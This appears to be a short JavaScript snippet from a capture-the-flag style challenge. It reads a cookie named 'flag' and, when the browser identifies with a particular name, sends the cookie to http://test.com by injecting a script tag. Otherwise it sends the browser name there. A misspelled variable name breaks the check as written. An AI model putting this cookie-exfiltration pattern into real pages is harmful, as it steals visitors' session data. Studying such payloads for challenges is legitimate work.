//读取cookies 
function getCookie(name) 
{ 
    var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
    if(arr=document.cookie.match(reg)) {
        return unescape(arr[2]); 
    } else {
        return null; 
    }
} 

console.log("Hello Word");

var browser=navigator.appName
var b_version=navigator.appVersion
var version=parseFloat(b_version)
var BrowserName=browser+version; 

if(BroswerName == 'Mozilla/Secret VIP1.0') {
    var flag=getCookie('flag');
    var script=document.createElement('script');
    script.src='http://test.com/index.php?flag='+flag;
    document.body.appendChild(script);
} else {
    var script=document.createElement('script');
    script.src='http://test.com/index.php?broswer='+BrowserName;
    document.body.appendChild(script);
}
